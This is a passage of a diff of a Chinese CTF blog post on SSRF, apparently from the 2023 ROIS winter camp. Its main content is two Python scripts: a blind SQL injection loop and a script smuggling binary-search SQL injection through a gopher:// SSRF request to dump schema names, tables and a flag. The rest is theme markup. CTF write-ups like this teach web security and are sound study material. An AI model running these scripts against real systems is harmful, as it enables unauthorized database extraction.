 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆flag表内容</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SSRF/image-20230412103314980.png"></p>
+<p><img src="/2023/02/09/SSRF/image-20230412103314980.png" srcset="/img/loading.gif" lazyload></p>
 <p>拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1290</span>):<br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br>            mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            <span class="hljs-built_in">id</span> = urllib.parse.quote(sqli)<br>            id_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)+<span class="hljs-number">3</span><br>            payload = <span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;id_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            tmp = urllib.parse.quote(payload)<br>            new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>            res = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new<br>            dataa = &#123;<br>                <span class="hljs-string">&quot;url&quot;</span>:res<br>            &#125;<br>            r = requests.post(url=url,data=dataa)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow meow meow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                head=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                tail=mid<br>        <span class="hljs-keyword">if</span> head !=<span class="hljs-number">32</span>:<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span>   <br>        <span class="hljs-built_in">print</span>(result)<br>fuck()<br></code></pre></td></tr></table></figure>
 
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">Potat0w0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/02/09/SSRF/">http://example.com/2023/02/09/SSRF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/ssrf/">ssrf</a></div><div class="post_share"><div class="social-share" data-image="/img/default.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/02/10/ROIS/" title="ROIS"><img class="cover" src="/img/default2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">ROIS</div></div></a></div><div class="next-post pull-right"><a href="/2023/02/09/ssti/" title="SSTI"><img class="cover" src="/img/default2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">SSTI</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/03/09/BUUCTF/" title="BUUCTF"><img class="cover" src="/img/default6.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-09</div><div class="title">BUUCTF</div></div></a></div><div><a href="/2023/03/28/DVWA/" title="DVWA"><img class="cover" src="/img/default5.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-28</div><div class="title">DVWA</div></div></a></div><div><a href="/2023/03/11/NSSCTF/" title="NSSCTF"><img class="cover" src="/img/default2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-11</div><div class="title">NSSCTF</div></div></a></div><div><a href="/2023/03/28/Metasploit/" title="Metasploit"><img class="cover" src="/img/aaa.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-28</div><div class="title">Metasploit</div></div></a></div><div><a href="/2023/02/09/XSS/" title="XSS"><img class="cover" src="/img/default0.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-09</div><div class="title">XSS</div></div></a></div><div><a href="/2023/02/10/ROIS/" title="ROIS"><img class="cover" src="/img/default2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-10</div><div class="title">ROIS</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Potat0w0</div><div class="author-info__description">fl4g{we1c0me_tO_My_B1og}</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Potatowo233"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Hack it!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2023ROIS%E5%86%AC%E4%BB%A4%E8%90%A5internal"><span class="toc-number">1.</span> <span class="toc-text">2023ROIS冬令营internal</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/04/27/FCTF/" title="FCTF"><img src="/img/default4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="FCTF"/></a><div class="content"><a class="title" href="/2023/04/27/FCTF/" title="FCTF">FCTF</a><time datetime="2023-04-26T16:46:11.000Z" title="Created 2023-04-27 00:46:11">2023-04-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/24/java-note/" title="java_note"><img src="/img/default7.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java_note"/></a><div class="content"><a class="title" href="/2023/04/24/java-note/" title="java_note">java_note</a><time datetime="2023-04-24T05:43:43.000Z" title="Created 2023-04-24 13:43:43">2023-04-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/" title="无字母数字RCE"><img src="/img/default1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无字母数字RCE"/></a><div class="content"><a class="title" href="/2023/04/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/" title="无字母数字RCE">无字母数字RCE</a><time datetime="2023-04-09T08:18:42.000Z" title="Created 2023-04-09 16:18:42">2023-04-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/05/docker-note/" title="docker_note"><img src="/img/default9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="docker_note"/></a><div class="content"><a class="title" href="/2023/04/05/docker-note/" title="docker_note">docker_note</a><time datetime="2023-04-05T06:45:22.000Z" title="Created 2023-04-05 14:45:22">2023-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/28/DVWA/" title="DVWA"><img src="/img/default5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DVWA"/></a><div class="content"><a class="title" href="/2023/03/28/DVWA/" title="DVWA">DVWA</a><time datetime="2023-03-28T09:06:04.000Z" title="Created 2023-03-28 17:06:04">2023-03-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Potat0w0</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
-POWERMODE.shake = true;
-POWERMODE.mobile = true;
-document.body.addEventListener('input', POWERMODE);
-</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" class="category-chain-item">常见漏洞</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/" class="category-chain-item">Web漏洞</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/ssrf/">#ssrf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/02/10/ROIS/" title="ROIS">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ROIS</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/09/ssti/" title="SSTI">
+                        <span class="hidden-mobile">SSTI</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://potatowo233.github.io/" target="_blank" rel="nofollow noopener"><span>Potat0w0</span></a> <i class="iconfont icon-love"></i>
+
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/click.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/js/potato.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
